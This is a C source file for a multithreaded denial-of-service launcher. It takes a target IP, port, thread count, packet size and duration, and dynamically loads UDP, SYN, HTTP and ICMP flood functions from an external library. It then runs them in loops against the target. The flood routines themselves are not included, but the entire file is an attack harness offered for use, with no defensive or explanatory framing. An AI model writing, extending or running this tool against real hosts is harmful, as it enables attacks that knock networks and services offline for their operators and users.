#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <dlfcn.h>
#include <unistd.h>
#include <getopt.h>
#include <time.h>


typedef void (*attack_func_t)(const char *, int, int, int);

typedef struct {
    attack_func_t attack_func;
    const char *target;
    int port;
    int num_sockets;
    int packet_size;
    int duration;
    int rate_limit;
} AttackArgs;

void *attack_thread(void *arg) {
    AttackArgs *args = (AttackArgs *)arg;
    time_t start_time = time(NULL);
    int packets_sent = 0;

    while (1) {
        if (args->duration > 0 && (time(NULL) - start_time) >= args->duration) {
            break;
        }

        args->attack_func(args->target, args->port, args->num_sockets, args->packet_size);
        packets_sent++;

        if (args->rate_limit > 0) {
            usleep(args->rate_limit);
        }
    }

    printf("Thread finished. Packets sent: %d\n", packets_sent);
    return NULL;
}

void print_usage(const char *prog_name) {
    printf("Usage: %s --attack <udp|syn|http|icmp> --target <IP> --port <PORT>\n", prog_name);
    printf("          --threads <N> --sockets <N> --packet-size <BYTES> --duration <SEC>\n");
    printf("          --rate-limit <MICROSECONDS>\n");
}

int main(int argc, char *argv[]) {
    int opt;
    const char *attack_type = NULL;
    const char *target = NULL;
    int port = 0;
    int num_threads = 1;
    int num_sockets = 1;
    int packet_size = 1024;
    int duration = 0;       
    int rate_limit = 0;     

    static struct option long_options[] = {
        {"attack", required_argument, 0, 'a'},
        {"target", required_argument, 0, 't'},
        {"port", required_argument, 0, 'p'},
        {"threads", required_argument, 0, 'n'},
        {"sockets", required_argument, 0, 's'},
        {"packet-size", required_argument, 0, 'z'},
        {"duration", required_argument, 0, 'd'},
        {"rate-limit", required_argument, 0, 'r'},
        {"help", no_argument, 0, 'h'},
        {0, 0, 0, 0}
    };

    while ((opt = getopt_long(argc, argv, "a:t:p:n:s:z:d:r:h", long_options, NULL)) != -1) {
        switch (opt) {
            case 'a': attack_type = optarg; break;
            case 't': target = optarg; break;
            case 'p': port = atoi(optarg); break;
            case 'n': num_threads = atoi(optarg); break;
            case 's': num_sockets = atoi(optarg); break;
            case 'z': packet_size = atoi(optarg); break;
            case 'd': duration = atoi(optarg); break;
            case 'r': rate_limit = atoi(optarg); break;
            case 'h':
            default: print_usage(argv[0]); return 1;
        }
    }

    if (!attack_type || !target || port == 0 || num_threads < 1 || num_sockets < 1) {
        print_usage(argv[0]);
        return 1;
    }

    void *lib = dlopen("./libnet.so", RTLD_LAZY);
    if (!lib) {
        fprintf(stderr, "Failed to load libnet.so\n");
        return 1;
    }

    attack_func_t attack_func = NULL;
    if (strcmp(attack_type, "udp") == 0) {
        attack_func = dlsym(lib, "udp_flood");
    } else if (strcmp(attack_type, "syn") == 0) {
        attack_func = dlsym(lib, "syn_flood");
    } else if (strcmp(attack_type, "http") == 0) {
        attack_func = dlsym(lib, "http_flood");
    } else if (strcmp(attack_type, "icmp") == 0) {
        attack_func = dlsym(lib, "icmp_flood");
    } else {
        printf("Unknown attack type!\n");
        return 1;
    }

    pthread_t threads[num_threads];
    AttackArgs args = { attack_func, target, port, num_sockets, packet_size, duration, rate_limit };

    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, attack_thread, &args);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    dlclose(lib);
    return 0;
}
